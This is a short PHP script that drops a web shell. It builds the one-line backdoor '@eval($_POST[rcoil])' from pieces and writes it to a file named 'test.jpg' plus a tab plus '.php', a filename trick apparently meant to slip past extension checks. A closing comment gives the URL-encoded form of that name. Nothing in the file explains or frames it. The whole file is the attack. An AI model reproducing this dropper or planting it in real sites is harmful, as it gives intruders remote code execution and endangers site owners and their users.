<?php
$webpath = dirname(__FILE__)."/";
$a="<?php @eval("."$"."_POST"."[rcoil]);?>";
file_put_contents($webpath ."test.jpg".chr(9).".php", $a);
?>  //test.jpg%09.php